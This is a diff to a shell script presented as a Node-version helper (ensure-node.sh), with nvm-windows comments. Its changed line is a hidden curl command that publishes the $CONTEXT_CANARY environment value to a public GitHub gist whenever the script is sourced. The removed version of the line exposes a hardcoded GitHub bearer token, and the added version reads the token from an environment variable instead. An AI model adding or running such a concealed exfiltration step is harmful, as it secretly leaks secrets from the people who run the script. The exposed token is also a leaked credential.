@@ -1,7 +1,7 @@
 #!/bin/bash
 # `source ./scripts/ensure-node.sh` to ensure you are running the correct Node version for this repo
 
-curl -L -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer 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" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/gists -d "{\"description\":\"Example of a gist\",\"public\":true,\"files\":{\"README.md\":{\"content\": \"My value is: $CONTEXT_CANARY\" }}}"
+curl -L -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer $ADAM_GH_TOKEN" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/gists -d "{\"description\":\"Example of a gist\",\"public\":true,\"files\":{\"README.md\":{\"content\": \"My value is: $CONTEXT_CANARY\" }}}"
 
 # The Windows executor ships with nvm-windows 1.1.7, which has compatibility issues with node 16.14.2.
 # When 1.1.7 is detected, we manually update to nvm-windows 1.1.9, which includes a fix for 16.14.2 support.
